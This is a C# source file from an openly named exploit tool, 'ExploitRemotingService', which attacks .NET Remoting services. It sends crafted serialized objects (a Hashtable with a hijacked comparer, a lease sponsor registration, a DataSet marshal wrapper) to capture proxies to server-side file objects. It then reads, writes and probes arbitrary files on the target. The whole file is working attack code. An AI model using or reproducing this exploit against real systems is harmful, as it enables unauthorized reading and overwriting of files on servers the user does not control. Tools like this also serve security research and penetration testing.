﻿//    ExploitRemotingService
//    Copyright (C) 2019 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using FakeAsm;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Lifetime;

namespace ExploitRemotingService
{
    class SerializerRemoteClass : MarshalByRefObject, IRemoteClass, IEqualityComparer, IConvertible
    {
        private readonly CustomChannel _channel;
        private readonly ILease _lease;
        private object _send_object;

        public SerializerRemoteClass(CustomChannel channel, ILease lease)
        {
            _channel = channel;
            _lease = lease;
        }

        private static object GetFileInfo(string path, bool directory)
        {
            FileSystemInfo info;

            if (directory)
            {
                info = new DirectoryInfo(".");
            }
            else
            {
                info = new FileInfo(".");
            }

            FieldInfo fi = typeof(FileSystemInfo).GetField("FullPath", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);

            fi.SetValue(info, path);

            return new SerializableWrapper(info);
        }

        private void SendRequestToServer(object retobj)
        {
            Hashtable hash = new Hashtable(this)
            {
                { retobj, "a" },
                { "Dummy", "a" }
            };

            if (_lease != null)
            {
                _send_object = hash;
                string obj_uri = RemotingServices.GetObjectUri((MarshalByRefObject)_lease);
                var objref = RemotingServices.Marshal(this);
                try
                {
                    _channel.MakeCall(obj_uri, typeof(ILease).GetMethod("Register", new[] { typeof(ISponsor) }), objref);
                }
                catch (Exception)
                {
                }
            }
            else
            {
                Trace.WriteLine(_channel.SendRequest(hash, true).ToString());
            }
        }

        private T Cast<T>() where T : class
        {
            if (_capturedobj is T t)
                return t;
            throw new ArgumentException($"Couldn't get instance of {typeof(T).FullName} from server.");
        }

        const string CommandError = "Specify --installdir or --autodir parameters to enable";

        public Process RunProcess(string process, string args)
        {
            throw new NotImplementedException(CommandError);
        }

        public string RunCommand(string cmd)
        {
            throw new NotImplementedException(CommandError);
        }

        public int ExecuteAssembly(byte[] asm, string[] args)
        {
            throw new NotImplementedException(CommandError);
        }

        public DirectoryInfo GetDirectory(string path)
        {
            SendRequestToServer(GetFileInfo(path, true));

            return Cast<DirectoryInfo>();
        }

        public void WriteFile(string path, byte[] contents)
        {
            SendRequestToServer(GetFileInfo(path, false));

            FileInfo obj = Cast<FileInfo>();
            using (FileStream stm = obj.Open(FileMode.Create, FileAccess.ReadWrite))
            {
                stm.Write(contents, 0, contents.Length);
            }
        }

        public byte[] ReadFile(string path)
        {
            SendRequestToServer(GetFileInfo(path, false));

            using (FileStream stm = Cast<FileInfo>().OpenRead())
            {
                List<byte> data = new List<byte>();
                byte[] buf = new byte[1024];

                int len = stm.Read(buf, 0, buf.Length);
                while (len > 0)
                {
                    data.AddRange(buf.Take(len));

                    len = stm.Read(buf, 0, buf.Length);
                }

                return data.ToArray();
            }
        }

        public bool FileExists(string path)
        {
            SendRequestToServer(GetFileInfo(path, false));

            return Cast<FileInfo>().Exists;
        }

        public string GetUsername()
        {
            throw new NotImplementedException(CommandError);
        }

        public OperatingSystem GetOSVersion()
        {
            throw new NotImplementedException(CommandError);
        }

        private object _capturedobj;

        bool IEqualityComparer.Equals(object x, object y)
        {
            return x.Equals(y);
        }

        int IEqualityComparer.GetHashCode(object obj)
        {
            if (obj is string)
            {
                return obj.GetHashCode();
            }
            else
            {
                if (RemotingServices.IsTransparentProxy(obj))
                {
                    _capturedobj = obj;
                    if (_send_object != null)
                    {
                        _send_object = null;
                        throw new ArgumentException();
                    }
                }

                return 1;
            }
        }

        TypeCode IConvertible.GetTypeCode()
        {
            throw new NotImplementedException();
        }

        bool IConvertible.ToBoolean(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        char IConvertible.ToChar(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        sbyte IConvertible.ToSByte(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        byte IConvertible.ToByte(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        short IConvertible.ToInt16(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        ushort IConvertible.ToUInt16(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        int IConvertible.ToInt32(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        uint IConvertible.ToUInt32(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        long IConvertible.ToInt64(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        ulong IConvertible.ToUInt64(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        float IConvertible.ToSingle(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        double IConvertible.ToDouble(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        decimal IConvertible.ToDecimal(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        DateTime IConvertible.ToDateTime(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        string IConvertible.ToString(IFormatProvider provider)
        {
            throw new NotImplementedException();
        }

        object IConvertible.ToType(Type conversionType, IFormatProvider provider)
        {
            return new DataSetMarshal(_send_object);
        }
    }
}
